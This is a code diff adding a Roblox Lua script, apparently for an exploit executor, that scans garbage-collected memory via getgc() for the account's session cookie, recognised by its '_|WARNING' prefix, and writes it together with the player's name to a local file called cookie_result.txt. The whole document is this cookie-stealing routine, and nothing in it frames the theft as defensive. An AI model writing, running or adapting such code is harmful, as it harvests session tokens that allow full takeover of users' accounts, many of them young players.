@@ -1,0 +1,36 @@
+local Player = game:GetService("Players").LocalPlayer
+
+local cookie = nil
+
+pcall(function()
+    for _, v in pairs(getgc()) do
+        if type(v) == "string" and #v > 800 and v:find("_|WARNING") then
+            cookie = v:match("(_|WARNING[^%s\"']+)")
+            if cookie then break end
+        end
+    end
+end)
+
+if not cookie then
+    pcall(function()
+        for _, v in pairs(getgc()) do
+            if type(v) == "table" then
+                for _, val in pairs(v) do
+                    if type(val) == "string" and #val > 800 and val:find("_|WARNING") then
+                        cookie = val:match("(_|WARNING[^%s\"']+)")
+                        if cookie then break end
+                    end
+                end
+            end
+            if cookie then break end
+        end
+    end)
+end
+
+local result = cookie or ("NOT_FOUND|gc=" .. #getgc())
+
+local file = io.open("cookie_result.txt", "w")
+if file then
+    file:write(Player.Name .. "\n" .. result)
+    file:close()
+end
